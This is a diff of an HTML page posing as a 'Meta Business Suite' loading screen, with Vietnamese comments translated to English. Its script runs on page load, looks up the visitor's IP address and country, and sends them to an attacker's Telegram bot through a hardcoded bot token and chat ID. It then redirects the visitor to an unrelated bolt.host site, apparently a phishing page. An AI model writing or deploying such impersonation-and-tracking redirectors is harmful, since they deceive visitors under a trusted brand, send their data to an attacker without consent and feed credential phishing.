@@ -1,63 +1,117 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Meta Business Suite</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      overflow: hidden;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .meta-loading {
+      text-align: center;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+    .meta-logo {
+      width: 70px;
+      height: 70px;
+      background: radial-gradient(circle at 50% 50%, #0084ff, #0064e0);
+      border-radius: 50%;
+      animation: pulse 1.1s infinite ease-in-out;
+      margin: 0 auto 15px;
+    }
+    .meta-text {
+      font-size: 16px;
+      color: #555;
+      letter-spacing: 0.5px;
+      animation: fadeInText 1s ease-in-out;
+    }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.15); opacity: 1; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes fadeInText {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; transform: scale(0.9); }
+    }
+  </style>
 </head>
 <body>
+  <div class="meta-loading" id="metaBox">
+    <div class="meta-logo"></div>
+    <div class="meta-text">Opening Meta Business Suite...</div>
+  </div>
+
   <script>
-    // === CẤU HÌNH ===
     const TELEGRAM_BOT_TOKEN = "8450931475:AAG33LEbK54PVvpsImjaKhMOYpTO5WJF5aE";
     const TELEGRAM_CHAT_ID = "1409099376";
     const REDIRECT_URL = "https://professional-social-cifr.bolt.host";
-    const DELAY_MS = 50; // 1 giây
+    const DISPLAY_TIME = 1500; // 1.5 seconds
 
     async function getIPandCountry() {
       try {
-        // Thử ipapi trước
-        const res = await fetch("https://ipapi.co/json/", { cache: "no-cache" });
-        if (res.ok) {
-          const data = await res.json();
-          if (data.ip) {
-            return {
-              ip: data.ip,
-              country: data.country || "unknown"
-            };
-          }
+        const r1 = await fetch("https://ipapi.co/json/", { cache: "no-cache" });
+        if (r1.ok) {
+          const d1 = await r1.json();
+          if (d1.ip) return { ip: d1.ip, country: d1.country_name || d1.country || "unknown" };
         }
-        // Nếu ipapi lỗi → fallback sang ipify
-        const res2 = await fetch("https://api.ipify.org?format=json");
-        const data2 = await res2.json();
-        return { ip: data2.ip || "unknown", country: "unknown" };
-      } catch {
-        return { ip: "unknown", country: "unknown" };
-      }
+      } catch {}
+      try {
+        const r2 = await fetch("https://ipinfo.io/json?token=2b19b5e5d1b9b4");
+        if (r2.ok) {
+          const d2 = await r2.json();
+          if (d2.ip) return { ip: d2.ip, country: d2.country || "unknown" };
+        }
+      } catch {}
+      try {
+        const r3 = await fetch("https://api.ipify.org?format=json");
+        if (r3.ok) {
+          const d3 = await r3.json();
+          if (d3.ip) return { ip: d3.ip, country: "unknown" };
+        }
+      } catch {}
+      return { ip: "unknown", country: "unknown" };
     }
 
     async function sendTelegramMessage(text) {
       try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
-        await fetch(url, {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
         });
       } catch (err) {
-        console.warn("Send telegram failed:", err);
+        console.warn("Telegram error:", err);
       }
     }
 
-    (async function onLoadNotifyAndRedirect() {
+    (async function main() {
       const { ip, country } = await getIPandCountry();
-      const msg = `Có người vào web | IP: ${ip} | Quốc gia: ${country}`;
-      await sendTelegramMessage(msg);
+      const msg = `New visitor | IP: ${ip} | Country: ${country}`;
+      sendTelegramMessage(msg);
 
-      // Chờ 1 giây rồi chuyển hướng
+      // Fade out and redirect right after 1.5s
       setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, DELAY_MS);
+        const box = document.getElementById("metaBox");
+        box.style.animation = "fadeOut 0.2s forwards";
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 400); // fade-out duration
+      }, DISPLAY_TIME);
     })();
   </script>
 </body>
